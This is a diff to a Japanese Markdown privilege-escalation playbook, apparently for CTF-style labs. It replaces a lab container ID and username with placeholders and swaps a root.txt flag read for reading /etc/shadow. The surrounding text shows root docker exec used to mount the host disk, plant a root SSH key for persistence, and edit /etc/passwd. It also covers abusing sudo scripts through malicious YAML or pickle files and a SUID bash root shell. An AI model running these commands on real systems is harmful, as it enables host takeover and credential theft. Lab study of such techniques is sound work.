@@ -182,7 +182,7 @@ sudo /opt/scripts/backup.sh
 ```bash
 # /etc/hosts の確認（コンテナ内でのホスト名 = コンテナID）
 # パストラバーサルで読み取った場合も同様
-# 出力例: 172.17.0.2   e6ff5b1cbc85
+# 出力例: 172.17.0.2   [CONTAINER_ID]
 ```
 
 **ステップ2: コンテナ内で root として実行できるか確認**
@@ -210,9 +210,9 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] ls /dev/sd*
 sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
   sh -c 'mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host'
 
-# ホストのファイルを読み取る
+# ホストの shadow / 権限確認用ファイルを読み取る
 sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
-  sh -c 'cat /mnt/host/root/root.txt'
+  sh -c 'cat /mnt/host/etc/shadow | head -1'
 
 # ホストに root SSH 公開鍵を書き込む（永続化）
 sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
@@ -222,7 +222,7 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
 ### 注意点・落とし穴
 - コンテナが通常モード（non-privileged）でも `/dev/sda*` が見えることがある。見えたらマウントを試みる
 - `-it` フラグ（インタラクティブ + TTY）は TTY を確保するが、環境によっては動作しない。その場合は `-i` のみ、または `sh -c '[COMMAND]'` を使う
-- マウント後のパスはコンテナ内のパス。ホストの `/root/root.txt` は `/mnt/host/root/root.txt` でアクセス
+- マウント後のパスはコンテナ内のパス。ホストの `/etc/shadow` は `/mnt/host/etc/shadow` でアクセス
 - ホストのファイルシステムへの書き込みも可能なため、SSH 鍵の埋め込みや `/etc/passwd` の書き換えも実施できる
 - `/dev/sda1` が見つからない場合は `lsblk` で確認。`vda1`・`nvme0n1p1` 等、環境によってデバイス名が異なる
 
@@ -255,7 +255,7 @@ sudo /snap/bin/docker exec --user root [CONTAINER_ID] \
 | スクリプトの中身 | 意味 | 次のアクション |
 |----------------|------|-------------|
 | `YAML.load(File.read("dependencies.yml"))` （相対パス） | カレントディレクトリのファイルを読む。書き込み可能ディレクトリで sudo を実行すれば任意YAMLを読ませられる | 自分が書けるディレクトリに移動 → 悪意ある `dependencies.yml` を作成 → sudo 実行 |
-| `YAML.load(File.read("/home/henry/deps.yml"))` （絶対パス かつ 自分のホームディレクトリ） | ホームディレクトリは通常書き込み可能 | 同上 |
+| `YAML.load(File.read("/home/[USER]/deps.yml"))` （絶対パス かつ 自分のホームディレクトリ） | ホームディレクトリは通常書き込み可能 | 同上 |
 | `YAML.safe_load(...)` | 安全なロード。任意オブジェクトのデシリアライズは不可 | このパターンは使えない。スクリプトの他の箇所を確認 |
 | `pickle.load(open("backup.pkl", "rb"))` | Python の pickle デシリアライゼーション。任意コード実行可能 | pickle ファイルを偽装して配置 |
 
@@ -317,7 +317,7 @@ ls -la /bin/bash
 
 # 確認
 id
-# uid=1000(henry) gid=1000(henry) euid=0(root) egid=0(root)
+# uid=1000([USER]) gid=1000([USER]) euid=0(root) egid=0(root)
 ```
 
 #### Step 5（原状回復・必須）
